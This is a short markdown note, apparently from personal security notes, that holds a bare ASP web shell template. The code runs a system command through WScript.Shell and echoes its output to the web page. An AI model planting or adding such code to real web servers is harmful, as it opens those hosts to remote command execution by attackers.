---
publish: true
created: 2026-10-03T08:40:24.744Z
modified: 2026-10-03T08:40:24.744Z
---

Simple asp file

```asp
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```
